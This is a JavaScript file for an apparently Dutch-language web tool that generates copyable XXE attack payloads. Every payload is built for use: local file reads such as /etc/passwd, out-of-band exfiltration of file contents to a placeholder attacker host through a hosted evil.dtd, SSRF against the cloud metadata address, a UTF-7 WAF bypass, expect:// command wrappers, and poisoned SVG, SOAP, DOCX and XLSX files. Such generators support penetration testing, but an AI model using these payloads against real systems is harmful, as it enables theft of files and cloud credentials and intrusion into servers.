// XXE Payload Generator — client-side payload building voor copy-paste
(function () {
  'use strict';

  var root = document.getElementById('xxe-generator');
  if (!root) return;

  function $(id) { return document.getElementById(id); }

  function esc(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function copyText(text, btn) {
    navigator.clipboard.writeText(text).then(function () {
      var orig = btn.textContent;
      btn.textContent = 'Gekopieerd!';
      setTimeout(function () { btn.textContent = orig; }, 1200);
    });
  }

  function renderOutput(containerId, payloads) {
    var container = $(containerId);
    if (!container) return;
    var html = '';
    for (var i = 0; i < payloads.length; i++) {
      var p = payloads[i];
      html += '<div class="gen-block">';
      html += '<div class="gen-label">' + esc(p.label) + '</div>';
      html += '<div class="gen-query"><pre><code>' + esc(p.payload) + '</code></pre>';
      html += '<button class="btn-sm btn-copy" data-idx="' + i + '">Kopieer</button>';
      html += '</div></div>';
    }
    container.innerHTML = html;
    container.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        copyText(payloads[parseInt(this.dataset.idx)].payload, this);
      });
    });
  }

  $('xxe-gen-btn').addEventListener('click', function () {
    var file    = $('xxe-file').value || '/etc/passwd';
    var cb      = $('xxe-callback').value || 'http://ATTACKER';
    var entity  = $('xxe-entity').value || 'xxe';
    var wrapper = $('xxe-wrapper').value || 'none';

    var fileRef = file;
    if (wrapper === 'php_base64') {
      fileRef = 'php://filter/convert.base64-encode/resource=' + file;
    } else if (wrapper === 'php_utf7') {
      fileRef = 'php://filter/convert.iconv.utf-8.utf-7/resource=' + file;
    } else if (wrapper === 'expect') {
      fileRef = 'expect://' + file;
    }

    var results = [];

    // Classic inline XXE
    results.push({
      label: 'Classic XXE — file read (inline)',
      payload: '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY ' + entity + ' SYSTEM "' + fileRef + '">\n' +
               ']>\n' +
               '<foo>&' + entity + ';</foo>',
    });

    // XXE via parameter entity
    results.push({
      label: 'Parameter Entity XXE',
      payload: '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY % ' + entity + ' SYSTEM "' + fileRef + '">\n' +
               '  %' + entity + ';\n' +
               ']>\n' +
               '<foo>bar</foo>',
    });

    // OOB via externe DTD
    results.push({
      label: 'OOB XXE — externe DTD + callback',
      payload: '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY % xxe SYSTEM "' + cb + '/xxe/yolo.dtd?request=' + file + '&callback=' + cb + '">\n' +
               '  %xxe;\n' +
               ']>\n' +
               '<foo>bar</foo>',
    });

    // Error-based XXE
    results.push({
      label: 'Error-based XXE — via fout.dtd',
      payload: '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY % xxe SYSTEM "' + cb + '/xxe/fout.dtd?resource=' + file + '">\n' +
               '  %xxe;\n' +
               ']>\n' +
               '<foo>bar</foo>',
    });

    // Blind OOB via eigen DTD
    results.push({
      label: 'Blind OOB XXE — eigen hosted DTD',
      payload: '-- Hosted DTD (op ' + cb + '/evil.dtd):\n' +
               '<!ENTITY % file SYSTEM "' + fileRef + '">\n' +
               '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'' + cb + '/xxe/froufrou?naam=loot&hatseflats=%file;\'>">\n' +
               '%eval;\n%exfil;\n\n' +
               '-- XML payload:\n' +
               '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY % dtd SYSTEM "' + cb + '/evil.dtd">\n' +
               '  %dtd;\n' +
               ']>\n' +
               '<foo>bar</foo>',
    });

    // XInclude
    results.push({
      label: 'XInclude — geen DOCTYPE controle nodig',
      payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n' +
               '  <xi:include parse="text" href="' + fileRef + '"/>\n' +
               '</foo>',
    });

    // SVG XXE
    results.push({
      label: 'SVG XXE — image upload vector',
      payload: '<?xml version="1.0" standalone="yes"?>\n' +
               '<!DOCTYPE svg [\n' +
               '  <!ENTITY ' + entity + ' SYSTEM "' + fileRef + '">\n' +
               ']>\n' +
               '<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">\n' +
               '  <text font-size="16" x="0" y="16">&' + entity + ';</text>\n' +
               '</svg>',
    });

    // SSRF via XXE
    results.push({
      label: 'SSRF via XXE — interne service scannen',
      payload: '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">\n' +
               ']>\n' +
               '<foo>&ssrf;</foo>',
    });

    // SOAP XXE
    results.push({
      label: 'SOAP XXE — XML Web Service',
      payload: '<?xml version="1.0" encoding="UTF-8"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY ' + entity + ' SYSTEM "' + fileRef + '">\n' +
               ']>\n' +
               '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n' +
               '  <soap:Body>\n' +
               '    <Request>\n' +
               '      <Data>&' + entity + ';</Data>\n' +
               '    </Request>\n' +
               '  </soap:Body>\n' +
               '</soap:Envelope>',
    });

    // UTF-7 encoded XXE (WAF bypass)
    results.push({
      label: 'UTF-7 encoded XXE — WAF bypass',
      payload: '<?xml version="1.0" encoding="UTF-7"?>\n' +
               '+ADwAIQ-DOCTYPE foo +AFsAPA-+ACE-ENTITY xxe SYSTEM +ACI-' + file + '+ACI+AD4AXQA+-\n' +
               '+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4-',
    });

    // XLSX XXE
    results.push({
      label: 'XLSX XXE — [Content_Types].xml in .xlsx',
      payload: '-- Unzip .xlsx, bewerk [Content_Types].xml:\n' +
               '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY ' + entity + ' SYSTEM "' + fileRef + '">\n' +
               ']>\n' +
               '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n' +
               '  <!-- Voeg &' + entity + '; toe in een van de xl/sharedStrings.xml entries -->\n' +
               '</Types>',
    });

    // DOCX XXE
    results.push({
      label: 'DOCX XXE — word/document.xml in .docx',
      payload: '-- Unzip .docx, bewerk word/document.xml:\n' +
               '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' +
               '<!DOCTYPE foo [\n' +
               '  <!ENTITY ' + entity + ' SYSTEM "' + fileRef + '">\n' +
               ']>\n' +
               '<!-- Voeg &' + entity + '; toe in een <w:t> element -->',
    });

    renderOutput('xxe-gen-output', results);
  });
})();
